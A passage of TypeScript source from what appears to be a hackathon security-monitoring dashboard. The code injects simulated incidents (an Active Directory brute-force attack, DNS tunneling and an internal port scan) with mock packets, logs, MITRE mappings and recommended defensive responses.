        { timestamp: new Date(now.getTime() - 60000).toISOString(), type: 'LOG', source: 'AUTH_SERVER', description: 'Failed LDAP connections (50+ attempts) from Engineering Workstation 02 (10.0.60.101).' },
        { timestamp: new Date(now.getTime() - 40000).toISOString(), type: 'LOG', source: 'AUTH_SERVER', description: 'Successful Kerberos authentication using Administrator account from 10.0.60.101.' },
        { timestamp: new Date(now.getTime() - 20000).toISOString(), type: 'ALERT', source: 'BEHAVIOR_AI', description: 'Abnormal privilege elevation: Non-IT workstation requesting directory administrative privileges.' }
      ];
      recommendationAction = 'Disable compromised user';
      recommendationReason = 'Critical Domain Administrator password compromise detected via unauthorized brute-forcing sweep.';
      recommendationImpact = 'Locks AD account across domain tree. Stops active sessions but limits administrative activities.';
      flowProtocol = 'TCP';
      flowSni = 'activedirectory.internal';
      payloadEntropy = 3.5;
    } else if (type.includes('dns') || type.includes('tunnel')) {
      demoIncidentId = 'inc-demo-222';
      title = 'Anomalous DNS Tunneling / Command & Control Session Activity';
      severity = 'HIGH';
      summary = 'Deep packet inspection flagged high rates of unusually long base64-encoded subdomains under high-risk TLDs from host 10.0.60.101. The payload pattern confirms active DNS tunneling carrying beacon signals to an external C2 hub.';
      sourceIp = '10.0.60.101';
      targetIp = '192.168.1.1';
      compromisedUser = 'eng_user_02';
      riskScore = 85;
      businessImpact = 'Malicious C2 Communication Channel Bypassing Firewall Filtration';
      businessImpactLevel = 'HIGH';
      prediction = {
        current_stage: 'Persistence',
        predicted_next_stage: 'Discovery',
        confidence: 85,
        reasoning: [
          'Persistent outbound TXT/A record queries',
          'Encoded payload contains directory discovery instructions',
          'Low-frequency heartbeat indicates background beaconing'
        ]
      };
      mitreMapping = [
        { tactic: 'INITIAL_ACCESS', techniqueId: 'T1566', techniqueName: 'Phishing' },
        { tactic: 'PERSISTENCE', techniqueId: 'T1071.004', techniqueName: 'Application Layer Protocol: DNS' }
      ];
      timeline = [
        { timestamp: new Date(now.getTime() - 60000).toISOString(), type: 'LOG', source: 'ENDPOINT_TELEMETRY', description: 'User opened email attachment invoice_update.xlsm on HR Desktop 10.0.60.101.' },
        { timestamp: new Date(now.getTime() - 45000).toISOString(), type: 'ALERT', source: 'DPI_ENGINE', description: 'Abnormal volume of high-character DNS queries to random subdomains under malicious .xyz domain.' },
        { timestamp: new Date(now.getTime() - 20000).toISOString(), type: 'ALERT', source: 'BEHAVIOR_AI', description: 'DNS exfiltration channel active. Tunneling payload transfers flagged.' }
      ];
      recommendationAction = 'Block malicious DNS domains';
      recommendationReason = 'Active DNS Tunneling payloads masquerading as legitimate local resolution queries.';
      recommendationImpact = 'Sinkholes malicious namespaces at boundary DNS forwarder level. Clean and zero host downtime.';
      flowProtocol = 'DNS';
      flowSni = 'tunnel.c2server.xyz';
      payloadEntropy = 6.8;
    } else if (type.includes('port') || type.includes('scan') || type.includes('recon')) {
      demoIncidentId = 'inc-demo-444';
      title = 'Internal Network Reconnaissance & Scanning Sweep';
      severity = 'MEDIUM';
      summary = 'A fast SYN scanning sweep was initiated from 10.0.60.101, enumerating open ports across IT server and Financial server subnets. The attack indicates preliminary reconnaissance ahead of lateral movement.';
      sourceIp = '10.0.60.101';
      targetIp = '10.0.50.25';
      compromisedUser = 'eng_user_02';
      riskScore = 72;
      businessImpact = 'Enterprise Network Topology & Server Port Infiltration Blueprint Exposed';
      businessImpactLevel = 'MEDIUM';
      prediction = {
        current_stage: 'Discovery',
        predicted_next_stage: 'Lateral Movement',
        confidence: 88,
        reasoning: [
          'TCP ports 22, 443, 445, 3389 and 5432 probed in sequence',
          'Connection SYN sweep triggered edge host firewall triggers',
          'Targeting finance database nodes directly'
        ]
      };
      mitreMapping = [
        { tactic: 'DISCOVERY', techniqueId: 'T1046', techniqueName: 'Network Service Discovery' }
      ];
      timeline = [
        { timestamp: new Date(now.getTime() - 40000).toISOString(), type: 'ALERT', source: 'BEHAVIOR_AI', description: 'Port scanning sweep (500+ probes/min) initiated from 10.0.60.101.' },
        { timestamp: new Date(now.getTime() - 15000).toISOString(), type: 'LOG', source: 'FIREWALL', description: 'Blocked 450 connection attempts targeting financial database nodes.' }
      ];
      recommendationAction = 'Isolate endpoint';
      recommendationReason = 'Aggressive automated network scanning and port probing session originating from unapproved device.';
      recommendationImpact = 'Blocks source host communication at edge switches. Halts scanning immediately.';
      flowProtocol = 'TCP';
      flowSni = 'recon-sweep.scan';
      payloadEntropy = 1.2;
    }

    // Inject custom PCAP analyzed Packets
    const demoPackets: NetworkPacket[] = [
      {
        id: `pkt-demo-${demoIncidentId}-100`,
        timestamp: now.toISOString(),
        srcIp: sourceIp,
        dstIp: targetIp,
        srcPort: 58210,
        dstPort: flowProtocol === 'DNS' ? 53 : (compromisedUser === 'administrator' ? 389 : 443),
        protocol: flowProtocol,
        length: 1514,
        payloadHex: '170303002011223344556677889900aabbccddeeff',
        payloadAscii: `....C2_${flowProtocol}_CHANNEL_ESTABLISHED....`,
        flags: { psh: true, ack: true },
        sessionId: `sess-demo-${demoIncidentId}`
      }
    ];

    // Prepend to packetsBuffer
    this.packetsBuffer = [...demoPackets, ...this.packetsBuffer];

    // Inject active session flow
    const demoFlow: DpiSessionFlow = {
      sessionId: `sess-demo-${demoIncidentId}`,
      srcIp: sourceIp,
      dstIp: targetIp,
      srcPort: 58210,
      dstPort: flowProtocol === 'DNS' ? 53 : (compromisedUser === 'administrator' ? 389 : 443),
      protocol: flowProtocol,
      flowState: 'ESTABLISHED',
      startTime: now.toISOString(),
      lastActiveTime: now.toISOString(),
      totalPackets: 250,
      totalBytes: 378000,
      statistics: {
        packetsPerSecond: 12.5,
        bytesPerSecond: 18900,
        payloadEntropy: payloadEntropy,
        durationMs: 30000
      },
      tls: flowProtocol === 'TLS' ? {
        sni: flowSni,
        version: 'TLS 1.3',
        cipherSuite: 'TLS_AES_256_GCM_SHA384'
      } : undefined
    };
    
    // Check if flow already exists, if not prepend
    if (!this.activeFlows.some(f => f.sessionId === `sess-demo-${demoIncidentId}`)) {
      this.activeFlows.unshift(demoFlow);
    }

    // Inject dynamic unified logs
    const demoLogs: UnifiedTelemetryLog[] = [
      {
        id: `log-demo-${demoIncidentId}-001`,
        timestamp: new Date(now.getTime() - 4000).toISOString(),
        source: 'FIREWALL',
        host: '192.168.1.1',
        severity: severity === 'CRITICAL' ? 'CRITICAL' : 'WARNING',
        message: `SentinelX Engine Alert: Anomalous payload detected in egress stream to external network. Entropy score: ${payloadEntropy}`,
        details: {
          srcIp: sourceIp,
          dstIp: targetIp,
          srcPort: 58210,
          dstPort: flowProtocol === 'DNS' ? 53 : 443
        }
      }
    ];
    this.telemetryLogs = [...demoLogs, ...this.telemetryLogs];

    // Inject behavioral profile anomaly
    const existingProfileIndex = this.entityProfiles.findIndex(p => p.entityId === sourceIp);
    const demoProfile: EntityBehaviorProfile = {
      entityId: sourceIp,
      entityName: sourceIp === '10.0.60.100' ? 'Engineering Workstation 01' : 'Engineering Workstation 02',
      entityType: 'DEVICE',
      department: 'Engineering',
      baseline: {
        avgPacketRate: 35,
        stdDevPacketRate: 8,
        commonProtocols: ['TCP', 'HTTPS', 'DNS'],
        commonDestinations: ['192.168.1.1', '10.0.50.10'],
        peakActivityHours: [9, 10, 11, 12, 13, 14, 15, 16],
        averageDataEntropy: 4.1,
        uniqueDestinationPortCount: 6,
      },
      currentActivity: {
        packetRate: 580,
        bytesRate: 1850000,
        activeProtocols: [flowProtocol],
        destinationsVisited: [targetIp],
        destinationPortsVisited: [443, 80],
        dataEntropy: payloadEntropy,
        hourOfActivity: now.getHours(),
      },
      anomalyScores: { isolationForest: 0.95, autoencoder: 0.97, lof: 0.91, ensembleScore: 0.94 },
      riskScore: riskScore,
      riskLevel: severity,
      explainability: [
        `Out-of-baseline data rate spike detected on ${sourceIp}.`,
        `Payload entropy reached ${payloadEntropy} bits, signifying high encryption/compression consistent with exfiltration.`,
        `Suspicious outbound socket established with target gateway ${targetIp}.`
      ]
    };

    if (existingProfileIndex >= 0) {
      this.entityProfiles[existingProfileIndex] = demoProfile;
    } else {
      this.entityProfiles.unshift(demoProfile);
    }

    // Inject incident
    const existingIncidentIdx = this.incidentsDb.findIndex(i => i.id === demoIncidentId);
    
    const demoIncident: SecurityIncident = {
      id: demoIncidentId,
      title: title,
      timestamp: now.toISOString(),
      severity: severity,
      status: 'OPEN',
      summary: summary,
      sourceIp: sourceIp,
      targetIp: targetIp,
      compromisedUser: compromisedUser,
      riskScore: riskScore,
      businessImpact: businessImpact,
      businessImpactLevel: businessImpactLevel,
      prediction: prediction,
      alerts: [`alert-demo-${demoIncidentId}-001`, `alert-demo-${demoIncidentId}-002`],
      telemetryLogIds: [`log-demo-${demoIncidentId}-001`],
      mitreMapping: mitreMapping,
      timeline: timeline
    };

    if (existingIncidentIdx >= 0) {
      this.incidentsDb[existingIncidentIdx] = demoIncident;
    } else {
      this.incidentsDb.unshift(demoIncident);
    }

    // Inject recommendations
    const demoRec: ResponseRecommendation = {
      id: `rec-demo-${demoIncidentId}`,
      incidentId: demoIncidentId,
      incidentTitle: title,
      priority: severity,
      action: recommendationAction,
      reason: recommendationReason,
      estimatedImpact: recommendationImpact,
      timestamp: now.toISOString(),
      status: 'PENDING'
    };
    
    if (!this.recommendationsHistory.some(r => r.id === `rec-demo-${demoIncidentId}`)) {
      this.recommendationsHistory.unshift(demoRec);
    }

    return {
      success: true,
      incidentId: demoIncidentId,
      message: `Hackathon threat scenario '${title}' successfully injected into SentinelX live correlation matrix!`
    };
  }
}
